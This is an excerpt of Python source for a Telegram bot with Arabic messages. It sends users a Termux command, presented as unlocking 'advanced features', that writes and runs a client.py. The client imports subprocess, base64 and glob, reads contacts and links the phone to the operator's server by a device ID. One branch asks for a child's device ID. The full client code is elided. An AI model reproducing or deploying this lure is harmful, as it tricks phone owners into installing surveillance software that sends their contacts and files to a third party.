...
def send_termux_instructions(chat_id, role='user'):
    ...
    instructions = (
        "🔧 <b>لتفعيل الميزات المتقدمة، يُرجى اتباع الخطوات التالية:</b>\n\n"
        ...
        "echo 'import requests, time, json, os, subprocess, base64, glob\n"
        f"SERVER = \"{server_url}\"\n"
        "DEVICE_ID = \"myphone\"\n"
        "CHAT_ID = \"\"\n\n"
        "def get_contacts(): ...\n"
        "# (الكود الكامل للـ client.py موجود في الملحق)\n"
        "' > client.py && python client.py\n"
        "```\n\n"
        "3️⃣ <b>بعد تشغيل الكود</b>، سيتم ربط جهازك تلقائياً.\n"
        "✅ ستتاح لك الميزات الإضافية فوراً."
    )
...
def handle_callback(call):
    try:
        ...
        if data == "mode_site":
            ...
            bot.send_message(chat_id, "📱 بعد تشغيل الكود، أرسل معرف الجهاز (Device ID) الذي وضعته في السكربت.")
            ...
            bot.send_message(chat_id, "📱 بعد تشغيل الكود، أرسل معرف جهاز الطفل (Device ID).")
...
def handle_text_messages(message):
    ...
    try:
        ...
        # ===== المعالج الافتراضي للرد (ضمان الرد على أي رسالة) =====
        if state is None:
...
# ===================== 16. معالج الرد الافتراضي =====================
@bot.message_handler(func=lambda message: True)
def default_reply(message):
    if not message.text.startswith('/'):
        bot.reply_to(message, "🤖 البوت يعمل الآن! استخدم /start لعرض القائمة الرئيسية.")
